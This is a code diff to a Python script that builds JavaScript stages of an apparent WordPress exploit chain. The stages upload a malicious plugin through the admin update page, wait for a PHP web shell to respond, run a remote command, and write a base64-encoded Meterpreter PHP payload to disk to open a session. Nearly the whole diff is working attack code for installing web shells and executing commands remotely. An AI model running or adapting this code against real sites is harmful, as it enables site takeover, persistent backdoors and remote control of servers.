@@ -290,7 +290,7 @@ function installYertleShell()
 def six():
 	code = """
 var webShellPath    = "shell/shell.php";
-
+var phpMetShellPath = "shell/meterpreter.php";
 
 function installYertleShell()
 {
@@ -326,7 +326,7 @@ function installYertleShell()
 
 			var fileSize = pluginZipFile.length;
 
-			var boundary = "---------------------------82520842616842250352141452311";
+			var boundary = "---------------------------22222222222222222222222222222";
 
 			var uploadURI = "/wp-admin/update.php?action=upload-plugin";
 
@@ -414,11 +414,40 @@ def seven():
 
 
 
+
 def eight():
 	code = """
-function runCmd()
+const sleep = (milliseconds) => 
 {
-	console.log("Starting runCmd...");
+	return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+
+
+
+async function runCmd()
+{
+	// We can't use the uploaded shell to until 
+	// it's fully installed, check to make sure it's there...
+    while (true)
+	{
+		var testUri = "/wp-content/plugins/" + webShellPath;
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', testUri, false);  
+		xhr.send(null);
+
+		if (xhr.status == 200) 
+		{
+  			console.log("!! Our shell is ready!");
+  			break;
+		}
+		if (xhr.status == 404)
+		{
+			console.log("Shell is still 404'ing...");
+			await sleep(5000);
+			continue;
+		}
+	}
+
 
 	var cmd = "touch wooHooRCE.txt";
 
@@ -431,6 +460,7 @@ function runCmd()
 	
 	xhr.open("GET", uri, true);
 	xhr.send(null);
+	console.log("Remote command run!");
 }
 	"""
 
@@ -449,14 +479,6 @@ function runCmd()
 # Extra escaping needed below
 def nine():
 	code = """
-const sleep = (milliseconds) => 
-{
-	return new Promise(resolve => setTimeout(resolve, milliseconds))
-}
-
-
-
-
 async function hideYertleShell()
 {
 	// Make sure there isn't an extra carriage return
@@ -484,7 +506,7 @@ async function hideYertleShell()
 
 	var encodedPayload = btoa(payload);
 
-	var cmd = "php -r \'echo base64_decode(\"" + encodedPayload + "\");\' > shell.php\\n";
+	var cmd = "php -r \\'echo base64_decode(\\"" + encodedPayload + "\\");\\' > shell.php\\n";
 	var encodedCmd = btoa(cmd);
 
 
@@ -606,7 +628,7 @@ async function openPhpMeterpreterSession()
     ?>`;
 
     var payload = btoa(metPhpCommand);
-    var commandValue = "php -r \'echo base64_decode(\"" + payload + "\");\' > meterpreter.php\\n";
+    var commandValue = "php -r \\'echo base64_decode(\\"" + payload + "\\");\\' > meterpreter.php\\n";
     var encodedCommand = btoa(commandValue);
 
 
